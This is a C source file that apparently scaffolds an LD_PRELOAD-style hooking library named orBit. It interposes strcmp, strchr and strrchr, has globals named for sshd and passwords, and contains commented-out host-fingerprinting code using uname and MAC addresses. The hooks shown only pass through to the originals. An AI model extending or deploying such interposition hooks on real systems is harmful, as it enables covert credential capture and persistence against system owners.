#include "orBit.h"

uint8_t     sshd = 0;
int         fd = 0;
char        buf[ SIZE_BUF ];
uint8_t     sshpass = 0;
uint8_t     passwd = 0;

int	        strcmp( const char *s1, const char *s2 )
{
	static int ( *orig_strcmp ) (const char *, const char *) = NULL;
	if ( ! orig_strcmp )
		orig_strcmp = (int (*) (const char*, const char*)) dlsym ( RTLD_NEXT, "strcmp");
	return ( orig_strcmp( s1, s2 ));
}

char		 *strchr( const char *s, int c )
{
	static char * ( *orig_strchr ) (const char *, int c ) = NULL;
	if (! orig_strchr )
		orig_strchr = (char * (*) (const char*, int c )) dlsym ( RTLD_NEXT, "strchr");
	return ( orig_strchr( s, c ));
}

char		 *strrchr( const char *s, int c )
{
	static char * ( *orig_strrchr ) (const char *, int c ) = NULL;
	if (! orig_strrchr )
		orig_strrchr = (char * (*) (const char*, int c )) dlsym ( RTLD_NEXT, "strrchr");
	return ( orig_strrchr( s, c ));
}

/*
 * \fn __attribute__((constructor)) void __debug()
 * \brief This function is loaded when the library is loaded.
 */
__attribute__((constructor(101))) void __debug()
{
   
}

/*
 * \fn __attribute__((constructor)) void __init()
 * \brief This function is loaded when the library is loaded.
 */
__attribute__((constructor(102))) void __init()
{
    // # The information obtained through the uname function will allow us to identify the target.
    // # The following information is provided by uname:
    //      # Kernel version
    //      # Hostname
    //      # Architecture
    //      # System version
    // # We don't need to check if the syscall fails because the only possible error is EFAULT, but we always provide a valid buffer.
    /*struct utsname info;
    _orBit_memset( &info, 0, sizeof( struct utsname ));
	__asm__ volatile ("syscall" : : "a" ( __NR_uname ),
		      "D" (&info) :
		      "cc", "memory", "rsi", "rdx", "rcx", "r11");

    // # To obtain the MAC address or MAC addresses...
    struct ifreq    ifr[ 12 ];
    _orBit_memset( &ifr, 0, sizeof( struct ifreq ) * 12 );
    int idx = -1, err = 0;
    if ( get_mac_addr( ifr, &idx ) )
        err = ( err + 1 );*/
}

__attribute__((destructor)) void __end()
{
}
